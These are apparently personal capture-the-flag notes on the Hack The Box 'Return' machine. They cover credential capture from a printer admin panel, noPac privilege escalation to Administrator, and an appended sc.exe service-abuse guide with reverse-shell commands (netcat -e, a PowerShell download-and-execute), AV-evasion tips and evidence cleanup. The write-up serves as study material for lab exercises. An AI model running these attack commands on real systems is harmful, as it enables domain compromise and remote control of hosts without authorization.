```
sudo nmap -sS -sC -sV -p- 10.10.11.108
```
```
Nmap scan report for 10.10.11.108
Host is up (0.038s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-16 23:52:45Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
56143/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-16T23:53:42
|_  start_date: N/A
|_clock-skew: -6h41m24s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

lets check ldap/dns:
```
ldapsearch -x -H ldap://10.10.11.108 -s base -LLL
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=return,DC=local
ldapServiceName: return.local:printer$@RETURN.LOCAL
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=return,DC=local
serverName: CN=PRINTER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Confi
 guration,DC=return,DC=local
schemaNamingContext: CN=Schema,CN=Configuration,DC=return,DC=local
namingContexts: DC=return,DC=local
namingContexts: CN=Configuration,DC=return,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=return,DC=local
namingContexts: DC=DomainDnsZones,DC=return,DC=local
namingContexts: DC=ForestDnsZones,DC=return,DC=local
isSynchronized: TRUE
highestCommittedUSN: 102672
dsServiceName: CN=NTDS Settings,CN=PRINTER,CN=Servers,CN=Default-First-Site-Na
 me,CN=Sites,CN=Configuration,DC=return,DC=local
dnsHostName: printer.return.local
defaultNamingContext: DC=return,DC=local
currentTime: 20250916235549.0Z
configurationNamingContext: CN=Configuration,DC=return,DC=local
```
`return.local`
also see `printer.return.local`
lets add to `etc/hosts`
```
dig axfr @10.10.11.108 return.local 
```
```
; <<>> DiG 9.20.7-1-Debian <<>> axfr @10.10.11.108 return.local
; (1 server found)
;; global options: +cmd
; Transfer failed.
```
same failed for printer.return.local...

lets check out the site on port 80:
![[Pasted image 20250916195053.png]]

in settings i see:
![[Pasted image 20250916195118.png]]

we can change password ?!?!?

also want to point out the url is `/index.php` and `/settings.php`, so looks like that is the languaged used here...

ill update the password to `pwned123`

notice server address is `printer.return.local` ill check that url but it is the same, lets try using gobuster to see if we can find any hidden files/dirs:
```
gobuster dir -u http://return.local/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -x php,html,txt
```
```
/Index.php            (Status: 200) [Size: 28274]
/Images               (Status: 301) [Size: 150] [--> http://return.local/Images/]
/images               (Status: 301) [Size: 150] [--> http://return.local/images/]
/index.php            (Status: 200) [Size: 28274]
/index.php            (Status: 200) [Size: 28274]
/settings.php         (Status: 200) [Size: 29090]
```

/images returns forbidden... but maybe there is a possible file injection? not sure yet.

i get the same results for `printer.return.local`

welp now that we think we changed credentials for:
`svc-printer` : `pwned123`

lets try to auth against ldap, rpc, smb
```
smbmap -H 10.10.11.108 -u svc-printer -p pwned123

...nothing

 smbclient -L //return.local/ -N
 ....nothing
```
tried with printer.return.local as well and same thing, though it does say anonymous login successful....

```
enum4linux -a 10.10.11.108
also nothing and couldnt list shares...
```

```
rpcclient -U 'svc-printer' 10.10.11.108
Password for [WORKGROUP\svc-printer]:
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

hmmm... 

ill check burpsuite and see the req when i click update on the UI:
```
POST /settings.php HTTP/1.1
Host: printer.return.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://printer.return.local/settings.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: http://printer.return.local
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

ip=printer.return.local
```

ip is only field... ill put my ip and start nc -lvnp 389 see the traffic...
```
nc -lnvp 389                                                                
listening on [any] 389 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.108] 62937
0*`%return\svc-printer�
                       1edFg43012!!
```

nice so this whole time looked like i wasnt updating the password... 
`svc-printer`:`1edFg43012!!`

```
ldapwhoami -H ldap://10.10.11.108 \
  -D 'return.local\\svc-printer' -w '1edFg43012!!^C' -x -o nettimeout=5
... no auth
same with printer.return.local
```
lets try smb again:
```
smbclient -L //10.10.11.108/ -U 'svc-printer'
Password for [WORKGROUP\svc-printer]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.108 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

word!

lets check permissions with crackmap(switch it up):
```
crackmapexec smb 10.10.11.108 --shares -u svc-printer -p '1edFg43012!!'
SMB         10.10.11.108    445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
SMB         10.10.11.108    445    PRINTER          [+] Enumerated shares
SMB         10.10.11.108    445    PRINTER          Share           Permissions     Remark
SMB         10.10.11.108    445    PRINTER          -----           -----------     ------
SMB         10.10.11.108    445    PRINTER          ADMIN$          READ            Remote Admin
SMB         10.10.11.108    445    PRINTER          C$              READ,WRITE      Default share
SMB         10.10.11.108    445    PRINTER          IPC$            READ            Remote IPC
SMB         10.10.11.108    445    PRINTER          NETLOGON        READ            Logon server share 
SMB         10.10.11.108    445    PRINTER          SYSVOL          READ            Logon server share 
```
lets look thru... 
admin has a lot ill revisit, looking for quick win

i check C$ since we have write and read permissions... and there it is under C:\Users\svc-printer\Desktop -> user.txt, ill mget that and:
```
cat user.txt
7e0dd5223610**********
```

USER PWNED

---

### Priv Esc

Before we go back to the smb shares:
```
ldapsearch -x -H ldap://printer.return.local -D 'svc-printer@return.local' -w '1edFg43012!!' -b 'dc=return,dc=local' '(memberOf=*)' memberOf sAMAccountName
```

i will try winrm in as svc-printer as we havent tried that yet lol:
```
evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'
```

worked! nice!

```
whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

damn!

they have a lot of priv:
```
SeIncreaseWorkingSetPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeMachineAccountPrivilege
```
all stand out to me.

we have used SeBackupPrivilege before, lets look at others... ill google to see if i can find any exploits that are handy...

i found this for SeMachineAccountPrivilege via google:
`https://www.hackingarticles.in/windows-privilege-escalation-samaccountname-spoofing/`

```
python3 noPac.py return.local/svc-printer:'1edFg43012!!' -dc-ip 10.10.11.108 -shell --impersonate administrator -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target printer.return.local
[*] will try to impersonate administrator
[*] Adding Computer Account "WIN-P4XLH2IYXF6$"
[*] MachineAccount "WIN-P4XLH2IYXF6$" password = 0Mq50UBEY!H1
[*] Successfully added machine account WIN-P4XLH2IYXF6$ with password 0Mq50UBEY!H1.
[*] WIN-P4XLH2IYXF6$ object = CN=WIN-P4XLH2IYXF6,CN=Computers,DC=return,DC=local
[*] WIN-P4XLH2IYXF6$ sAMAccountName == printer
[-] GetTGT error, error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[*] Reseting the machine account to WIN-P4XLH2IYXF6$
[*] Restored WIN-P4XLH2IYXF6$ sAMAccountName to original value
                                                                   
```
no bueno lets run:
```
sudo ntpdate 10.10.11.108
```

due to `GetTGT error, error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`

i now rerun:
```
python3 noPac.py return.local/svc-printer:'1edFg43012!!' -dc-ip 10.10.11.108 -shell --impersonate administrator -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target printer.return.local
[*] will try to impersonate administrator
[*] Adding Computer Account "WIN-GDBKHZJFOUG$"
[*] MachineAccount "WIN-GDBKHZJFOUG$" password = lpbpkN92IVgL
[*] Successfully added machine account WIN-GDBKHZJFOUG$ with password lpbpkN92IVgL.
[*] WIN-GDBKHZJFOUG$ object = CN=WIN-GDBKHZJFOUG,CN=Computers,DC=return,DC=local
[*] WIN-GDBKHZJFOUG$ sAMAccountName == printer
[*] Saving a DC's ticket in printer.ccache
[*] Reseting the machine account to WIN-GDBKHZJFOUG$
[*] Restored WIN-GDBKHZJFOUG$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] Saving a user's ticket in administrator.ccache
[*] Rename ccache to administrator_printer.return.local.ccache
[*] Attempting to del a computer with the name: WIN-GDBKHZJFOUG$
[-] Delete computer WIN-GDBKHZJFOUG$ Failed! Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>cd C:\Users\
[-] You can't CD under SMBEXEC. Use full paths.
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
b2b30edfb0a9************
```

BANG !

ROOT PWNED!

---

### Another exploit:

from oxdf(love that guy, like this for my notes for oscp):

> Short summary

This is a compact, exam‑style write‑up describing how to escalate to **NT AUTHORITY\SYSTEM** by abusing the Windows Service Control Manager (SCM) with `sc.exe` to spawn a reverse shell (`nc64.exe`). Use this in lab/OSCP-style environments only. Replace IPs/paths for each box.

---

## Files you need on attacker

- `nc64.exe` (or other reverse shell binary) can upload via winrm
    
- Optional: PowerShell reverse shell script (`ps_rev.ps1`) if `nc` is blocked
    

Host `nc64.exe` on your attacker machine for quick retrieval: e.g. or upload via winrm

```bash
# in folder with nc64.exe
python3 -m http.server 80
```

---

## Step‑by‑step (exact commands)

**1) Start listener on attacker**

```bash
nc -lnvp 443
```

**2) Upload `nc64.exe` to target**  
From an interactive shell on target (Evil‑WinRM, RDP, interactive CMD/PowerShell):

```powershell
# simple download using PowerShell (replace attacker IP)
powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.6/nc64.exe' -OutFile 'C:\ProgramData\nc64.exe'"
```

Alternative: use SMB push (smbclient, smbmap, etc.) if available.

**3) Configure an existing service to run our command**  
_Note: using `cmd.exe /c` wraps the reverse shell command so it launches correctly._

```cmd
cd C:\Windows\System32
sc.exe config VSS binpath= "C:\Windows\System32\cmd.exe /c C:\ProgramData\nc64.exe -e cmd 10.10.14.6 443"
sc.exe start VSS
```

If modifying a core service is blocked, create a temporary service:

```cmd
sc.exe create pwnsvc binpath= "C:\Windows\System32\cmd.exe /c C:\ProgramData\nc64.exe -e cmd 10.10.14.6 443" start= demand
sc.exe start pwnsvc
```

**4) Observe listener**  
Expect `nc` to connect back. Once connected:

```
whoami
# should show: NT AUTHORITY\SYSTEM
```

---

## Why this works

1. `sc.exe` tells the Service Control Manager (SCM) to run the command you supply when the service starts.
    
2. The SCM expects service binaries to call the Service API and report status. Typical user programs (cmd, nc) don’t do that.
    
3. SCM times out waiting for the service to behave and reports `1053` (didn’t respond in time). That only means the service wrapper didn’t behave like a long‑running service — it doesn’t kill arbitrary child processes.
    
4. `cmd.exe` starts `nc64.exe`. The child `nc64.exe` keeps running even after SCM times out, and since SCM started the process, it runs under the service account (usually SYSTEM).
    

---

## Required privileges & notes

- You need the ability to change or create services. That usually requires local Administrator or equivalent privileges.
    
- If `sc.exe config` returns `ACCESS DENIED`, you aren’t permitted to update that service. Try creating a new service (`sc create`) if allowed.
    
- If service ACLs deny changes for all services, this method won’t work.
    

---

## Troubleshooting

- **No connection on listener**: confirm attacker IP/port are correct; check target outbound firewall; try another port (e.g., 443, 4444, 53).
    
- **`sc.exe start` returns `FAILED 1053` but no shell**: check that `C:\ProgramData\nc64.exe` exists and is executable; validate the binary architecture (x64 vs x86). Try running the `cmd.exe /c` command manually on the target to reproduce.
    
- **AV/EDR kills nc.exe**: AV may block or quarantine the binary on start. Try PowerShell reverse shell or an obfuscated binary in lab mode.
    
- **`sc config` or `sc create` returns ACCESS DENIED**: you don’t have necessary privileges. Look for writable service ACLs or other privilege escalation paths.
    
- **Shell is unstable / children killed**: some host hardening/EDR kills child processes from failed services. Try alternate persistence (scheduled tasks, WMI, service binary path hijacks) or use a different binary.
    

---

## Cleanup (important)

On the target, remove evidence and restore service behavior when done:

```cmd
# kill reverse shell binary
taskkill /IM nc64.exe /F

# if you created a service
sc.exe stop pwnsvc
sc.exe delete pwnsvc

# if you modified a built-in service, revert its binpath (example for VSS)
sc.exe config VSS binpath= "C:\Windows\system32\vssvc.exe"

# delete the uploaded binary
del C:\ProgramData\nc64.exe
```

---

## PowerShell alternative (when `nc` is blocked)

Host a simple PS script `ps_rev.ps1` with a PowerShell reverse shell and run the service wrapped with `cmd.exe /c powershell ...`:

```cmd
sc.exe create pwnsvc binpath= "C:\Windows\System32\cmd.exe /c powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.6/ps_rev.ps1')\"" start= demand
sc.exe start pwnsvc
```

Note: quoting gets tricky — copy/paste exact string and test locally first.

---

## Notes / gotchas

- Shell history expansion may mangle special characters if you copy commands into PowerShell/CMD — paste carefully.
    
- If you use `sc create`, pick an innocuous service name and only create when needed.
    
- Always validate the binary works by running it manually first (e.g., `C:\ProgramData\nc64.exe -e cmd <attacker> <port>`) if you can.
    

---

## TL;DR

Use `sc.exe` to make SCM launch a command that spawns your reverse shell as a child process. SCM will often report `1053` (service failed to behave like a real service) — that’s expected. The spawned child frequently lives on as SYSTEM and connects back to your listener.

---
